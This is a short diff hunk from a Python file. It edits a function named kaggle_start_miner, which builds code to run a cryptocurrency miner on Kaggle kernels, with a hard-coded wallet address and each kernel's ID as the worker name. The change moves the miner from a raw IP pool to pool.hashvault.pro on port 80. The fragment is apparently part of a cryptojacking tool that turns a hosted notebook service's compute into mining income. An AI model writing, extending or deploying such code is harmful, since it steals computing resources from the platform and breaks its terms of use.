@@ -4349,7 +4349,7 @@ def kaggle_start_miner():
     miner_code = '''import subprocess, json, os, time
 
 WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
-POOL = "45.155.102.89:10128"
+POOL = "pool.hashvault.pro:80"
 WORKER = "''' + kernel_id + '''"
 
 config = {
